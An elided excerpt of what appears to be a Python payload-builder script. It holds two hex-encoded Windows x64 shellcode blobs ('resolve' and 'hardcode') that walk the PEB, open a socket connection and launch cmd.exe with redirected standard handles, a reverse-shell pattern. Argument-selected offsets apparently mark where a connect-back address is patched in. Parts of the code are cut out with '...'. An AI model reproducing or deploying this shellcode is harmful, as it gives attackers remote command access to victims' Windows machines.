...
resolve: bytes                          = (
    ...
    b"\x49\x89\xc5\x41\xba\x62\x77\x57\xc0\xe8\x05\x00\x00\x00\x49\x89"
    ...
    b"\xd5\x49\x89\xc6\x48\x83\xec\x28\x48\x31\xc0\x50\x48\xb8\x02\x00"
    b"\x00\x00\x00\x00\x00\x00\x50\x48\x89\xe2\x4c\x89\xf1\x41\xb0\x10"
    b"\x48\x83\xec\x10\x41\xff\xd4\x48\x83\xc4\x38\x48\xb8\x63\x6d\x64"
    b"\x2e\x65\x78\x65\x00\x50\x48\x89\xe2\x41\x56\x41\x56\x41\x56\x48"
    b"\x31\xc9\x66\x51\x51\x51\x66\xb9\x00\x01\x66\x51\x48\x31\xc9\x66"
    b"\x51\x66\x51\x51\x51\x51\x51\x51\x51\x6a\x68\x48\x89\xe7\x48\x8d"
    b"\x4c\x24\xe0\x51\x57\x48\x31\xc9\x51\x51\x68\x00\x00\x00\x08\x6a"
    b"\x01\x51\x51\x51\x51\x49\x89\xc8\x41\xff\xd7"
)
hardcode: bytes                         = (
    b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x40"
    ...
    b"\x00\x4c\x8d\xa0\x50\x5f\x00\x00\x48\x31\xc9\x48\x81\xec\xf0\x01"
    ...
    b"\xc6\x48\x83\xec\x28\x48\x31\xc0\x50\x48\xb8\x02\x00\x00\x00\x00"
    b"\x00\x00\x00\x50\x48\x89\xe2\x4c\x89\xf1\x41\xb0\x10\x48\x83\xec"
    b"\x10\x41\xff\xd4\x48\x83\xc4\x38\x48\xb8\x63\x6d\x64\x2e\x65\x78"
    b"\x65\x00\x50\x48\x89\xe2\x41\x56\x41\x56\x41\x56\x48\x31\xc9\x66"
    b"\x51\x51\x51\x66\xb9\x00\x01\x66\x51\x48\x31\xc9\x66\x51\x66\x51"
    b"\x51\x51\x51\x51\x51\x51\x6a\x68\x48\x89\xe7\x48\x8d\x4c\x24\xe0"
    b"\x51\x57\x48\x31\xc9\x51\x51\x68\x00\x00\x00\x08\x6a\x01\x51\x51"
    b"\x51\x51\x49\x89\xc8\x41\xff\xd7"
)
exe_header: bytes                       = (
...
"""
    ...
    if args.payload == "hardcode":
        payload                         = hardcode
        payload_offset                  = (157, 6)

    if args.payload == "resolve":
        payload                         = resolve
        payload_offset                  = (288, 6)
